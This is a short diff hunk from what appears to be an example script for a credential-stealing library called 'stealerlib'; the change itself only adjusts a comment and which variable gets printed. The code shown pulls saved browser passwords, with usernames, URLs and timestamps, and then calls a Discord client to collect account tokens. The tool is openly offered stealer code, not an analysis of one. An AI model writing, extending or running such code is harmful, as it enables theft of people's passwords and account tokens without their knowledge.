@@ -12,8 +12,8 @@ from stealerlib.browser import Browser
 
 if __name__ == '__main__':
     browser = Browser()
-    passwords = browser.get_passwords()
-    print(browser.passwords, '\n') # -> [(username, password, url, created, last_used), ...]
+    passwords = browser.get_passwords() # type='all'
+    print(passwords, '\n') # -> [(username, password, url, created, last_used), ...]
 
     client = Discord()
     client.get_tokens()
